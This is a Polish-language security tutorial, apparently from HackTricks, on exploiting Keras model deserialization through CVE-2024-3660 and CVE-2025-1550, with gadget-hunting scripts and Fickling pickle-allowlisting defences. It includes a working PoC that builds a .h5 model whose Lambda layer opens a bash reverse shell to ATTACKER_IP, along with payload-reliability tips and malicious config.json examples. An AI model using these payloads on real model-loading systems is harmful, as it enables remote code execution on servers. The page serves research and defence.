# Deserializacja modelu Keras: RCE i Gadget Hunting

{{#include ../banners/hacktricks-training.md}}

Ta strona podsumowuje praktyczne techniki eksploatacji potoku deserializacji modeli Keras, wyjaśnia wewnętrzną strukturę natywnego formatu .keras i jego powierzchnię ataku oraz przedstawia zestaw narzędzi badawczych do wyszukiwania podatności w plikach modeli (MFV) i gadgetów działających po poprawkach.

## Wewnętrzna struktura formatu modelu .keras

Plik .keras to archiwum ZIP zawierające co najmniej:<sup>[[1]](#references)</sup>
- metadata.json – ogólne informacje (np. wersja Keras)
- config.json – architekturę modelu (główną powierzchnię ataku)
- model.weights.h5 – wagi w formacie HDF5

config.json steruje rekurencyjną deserializacją: Keras importuje moduły, rozpoznaje klasy/funkcje i odtwarza warstwy/obiekty na podstawie słowników kontrolowanych przez atakującego.<sup>[[1]](#references)</sup>

Przykładowy fragment przedstawiający obiekt warstwy Dense:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Deserializacja wykonuje:<sup>[[1]](#references)</sup>
- Import modułów i rozwiązywanie symboli na podstawie kluczy module/class_name
- Wywołanie from_config(...) lub konstruktora z kontrolowanymi przez atakującego kwargs
- Rekurencyjne przetwarzanie zagnieżdżonych obiektów (aktywacji, inicjalizatorów, ograniczeń itd.)

Historycznie dawało to atakującemu, który tworzył config.json, kontrolę nad trzema elementami:<sup>[[1]](#references)</sup>
- Wyborem importowanych modułów
- Wyborem rozwiązywanych klas/funkcji
- Wartościami kwargs przekazywanymi do konstruktorów/from_config

## CVE-2024-3660 – RCE przez bajtkod warstwy Lambda

Przyczyna źródłowa:
- Deserializacja starszej wersji Lambda odtwarzała funkcję Pythona z kodu marshaled kontrolowanego przez atakującego: `func_load()` dekoduje payload z base64, wywołuje `marshal.loads()` i tworzy `FunctionType`. Bajtkod wynikowej funkcji uruchamia się przy wywołaniu Lambda, a loadery starsze niż wersja 2.13 nie sprawdzały trybu bezpiecznego dla starszych formatów.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

W natywnym archiwum Keras v3 funkcja Lambda jest reprezentowana jako obiekt `__lambda__`, którego pole `code` zawiera kod marshaled zakodowany w base64:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Mitigacja:
- Keras domyślnie wymusza `safe_mode=True` dla natywnego formatu Keras v3. Zserializowane lambdy Pythona w `Lambda` są blokowane, chyba że użytkownik jawnie wyłączy tę ochronę, ustawiając `safe_mode=False`; ta ochrona nie obejmuje w ten sam sposób starszych formatów.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Uwagi:
- Starsze formaty (starsze zapisy HDF5) lub starsze bazy kodu mogą nie wymuszać nowoczesnych kontroli, dlatego ataki typu „downgrade” nadal mogą działać, gdy ofiary korzystają ze starszych loaderów.

## CVE-2025-1550 – import dowolnych modułów w Keras 3.0.0–3.8.x

Przyczyna źródłowa:
- `_retrieve_class_or_fn` używał `importlib.import_module(module)` z ciągami nazwy modułu kontrolowanymi przez atakującego, pochodzącymi z `config.json`.
- Skutek: spreparowane archiwum `.keras` mogło spowodować, że `Model.load_model()` zaimportuje wybrane przez atakującego moduły i funkcje Pythona, wywołując efekty uboczne podczas importu i przekazując argumenty kontrolowane przez atakującego, nawet przy `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Pomysł na exploit:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Usprawnienia bezpieczeństwa (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Lista dozwolonych modułów: importy ograniczone do oficjalnych modułów ekosystemu: keras, keras_hub, keras_cv, keras_nlp
- Domyślny tryb bezpieczny: safe_mode=True blokuje niebezpieczne ładowanie serializowanych funkcji Lambda
- Podstawowe sprawdzanie typów: deserializowane obiekty muszą być zgodne z oczekiwanymi typami

## Praktyczne wykorzystanie: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Starsze wdrożenia TensorFlow-Keras mogą nadal akceptować pliki modeli HDF5 (`.h5`). Jeśli atakujący może przesłać model, który serwer później ładuje lub na którym wykonuje inferencję, podatny loader może deserializować warstwę Lambda zawierającą kod Python kontrolowany przez atakującego, który może następnie zostać wykonany w ramach przepływu pracy modelu aplikacji.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Minimalny PoC tworzący złośliwy plik .h5, którego Lambda uruchamia reverse shell, gdy cel wywoła model:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Uwagi i wskazówki dotyczące niezawodności:
- Punkty wyzwalające różnią się w zależności od formatu i przepływu pracy; w przywołanym opisie payload wykonał się dwukrotnie podczas predykcji. Zakładaj, że skutki uboczne mogą się powtarzać, i twórz payloady idempotentne.<sup>[[7]](#references)</sup>
- Przypinanie wersji: dopasuj TF/Keras/Python do środowiska ofiary, aby uniknąć niezgodności serializacji. Na przykład twórz artefakty w Pythonie 3.8 z TensorFlow 2.13.1, jeśli właśnie tego używa cel.<sup>[[7]](#references)</sup>
- Szybkie odtworzenie środowiska:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Walidacja: nieszkodliwy payload, taki jak os.system("ping -c 1 YOUR_IP"), pomaga potwierdzić wykonanie (np. obserwując pakiety ICMP za pomocą tcpdump) przed przejściem do reverse shell.<sup>[[7]](#references)</sup>

## Powierzchnia gadgetów po poprawce w allowliście

Nawet przy allowliście modułów Keras i włączonym safe mode dozwolone obiekty wywoływalne mogą powodować skutki uboczne. Na przykład `keras.utils.get_file` pobiera URL i zapisuje plik w skonfigurowanej lokalizacji cache, co czyni tę funkcję potencjalnym gadgetem do analizy.<sup>[[1]](#references)[[19]](#references)</sup>

Przykładowa konfiguracja Lambda (sygnaturę wywołania zweryfikuj w kontrolowanym teście):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Ważne ograniczenie:
- `Lambda.call()` zawsze przekazuje wejście modelu jako pierwszy argument pozycyjny, a skonfigurowane `arguments` jako argumenty nazwane. W przypadku `get_file` ta wartość pozycyjna wypełnia `fname`; niezgodność między tensorem a ścieżką może sprawić, że ten kandydat zawiedzie, zanim dojdzie do pobrania, więc nie jest to gwarantowany, działający gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Allowlisting importów pickle w modelach AI/ML (Fickling)

Wiele formatów modeli AI/ML (PyTorch `.pt`/`.pth`/`.ckpt`, artefakty joblib/scikit-learn i inne formaty natywne dla Pythona) osadza dane Python pickle. Opisana wyżej starsza ścieżka Keras Lambda wykorzystuje zamiast tego marshaled bytecode funkcji, więc stanowi odrębne ryzyko deserializacji. Opcode’y pickle mogą podczas deserializacji wywołać zachowanie kontrolowane przez atakującego, w tym modyfikację modelu lub RCE, a proste skanery mogą nie wykryć nowych ani niewymienionych niebezpiecznych importów.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Praktyczną ochroną fail-closed jest podpięcie się do deserializatora pickle w Pythonie i zezwalanie podczas unpicklingu wyłącznie na zweryfikowany zestaw nieszkodliwych importów związanych z ML. Fickling od Trail of Bits wdraża tę politykę i zawiera starannie opracowaną listę dozwolonych importów ML, zbudowaną na podstawie tysięcy publicznych plików pickle z Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Model bezpieczeństwa dla „bezpiecznych” importów (intuicje wynikające z badań i praktyki): symbole importowane i używane przez pickle muszą jednocześnie:<sup>[[8]](#references)</sup>
- Nie wykonywać kodu ani nie powodować jego wykonania (bez obiektów skompilowanego/kodu źródłowego, uruchamiania powłoki, hooków itp.)
- Nie odczytywać ani nie ustawiać dowolnych atrybutów lub elementów
- Nie importować ani nie uzyskiwać referencji do innych obiektów Pythona z maszyny wirtualnej pickle
- Nie uruchamiać żadnych wtórnych deserializatorów (np. marshal, zagnieżdżonego pickle), nawet pośrednio

Włącz zabezpieczenia Fickling jak najwcześniej podczas uruchamiania procesu, aby sprawdzane były wszystkie operacje ładowania pickle wykonywane przez frameworki (`torch.load`, `joblib.load` itp.):<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Wskazówki operacyjne:
- Możesz tymczasowo wyłączać i ponownie włączać hooki w razie potrzeby:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Jeśli sprawdzony model jest blokowany, rozszerz allowlistę dla swojego środowiska po sprawdzeniu symboli:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling udostępnia również ogólne runtime guards, jeśli wolisz bardziej szczegółową kontrolę:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() — wymuszanie kontroli dla wszystkich wywołań pickle.load()
  - with fickling.check_safety(): — kontrola ograniczona do danego zakresu
  - fickling.load(path) / fickling.is_likely_safe(path) — jednorazowa kontrola

- Jeśli to możliwe, wybieraj formaty modeli inne niż pickle (np. SafeTensors).<sup>[[15]](#references)</sup> Jeśli musisz akceptować pickle, uruchamiaj loadery z minimalnymi uprawnieniami, bez dostępu do sieci wychodzącej, i egzekwuj allowlist.

Ta strategia oparta w pierwszej kolejności na allowlist skutecznie blokuje typowe ścieżki exploitów wykorzystujących pickle w ML, zachowując przy tym wysoką zgodność. W benchmarku ToB Fickling wykrył 100% syntetycznych złośliwych plików i dopuścił około 99% czystych plików z popularnych repozytoriów Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Zestaw narzędzi badacza

1) Systematyczne wyszukiwanie gadgetów w dozwolonych modułach

Wyszukaj wszystkie potencjalne wywoływalne obiekty w keras, keras_nlp, keras_cv, keras_hub i nadaj priorytet tym, które mogą powodować skutki uboczne związane z plikami, siecią, procesami lub zmiennymi środowiskowymi.<sup>[[1]](#references)</sup>

<details>
<summary>Wyszukiwanie potencjalnie niebezpiecznych wywoływalnych obiektów w modułach Keras znajdujących się na allowlist</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Bezpośrednie testowanie deserializacji (archiwum .keras nie jest potrzebne)

Przekazuj specjalnie przygotowane słowniki bezpośrednio do deserializatorów Keras, aby poznać akceptowane parametry i obserwować efekty uboczne.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Testowanie między wersjami i formatami

Keras występuje w wielu bazach kodu i odsłonach, z różnymi zabezpieczeniami i formatami:<sup>[[1]](#references)</sup>
- Wbudowany Keras w TensorFlow: tensorflow/python/keras (przestarzały, przeznaczony do usunięcia)
- tf-keras: utrzymywany oddzielnie
- Oficjalny Keras 3 z obsługą wielu backendów: wprowadził natywny format .keras

Powtórz testy w różnych bazach kodu i formatach (.keras oraz starszy HDF5), aby wykryć regresje lub brakujące zabezpieczenia.

## References

- [1] [Wyszukiwanie podatności w deserializacji modeli Keras (blog huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [PR Keras nr 20751 – dodano kontrole serializacji](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE podczas deserializacji warstwy Lambda w Keras](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – dowolny import modułu w Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Zgłoszenie huntr – dowolny import nr 1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Zgłoszenie huntr – dowolny import nr 2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE przez warstwę Lambda w TensorFlow .h5, prowadzące do uzyskania uprawnień roota](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Blog Trail of Bits – nowy skaner plików pickle AI/ML w Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – zabezpieczanie środowisk AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Zbiór testowy do benchmarku skanowania pickle w Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Wprowadzenie do ataków Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Projekt SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – warstwy Lambda w Keras 2 umożliwiają wstrzyknięcie dowolnego kodu](https://kb.cert.org/vuls/id/253266)
- [17] [Kod źródłowy warstwy Lambda w Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Kod źródłowy narzędzi Pythona w Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API Keras `get_file`](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../banners/hacktricks-training.md}}
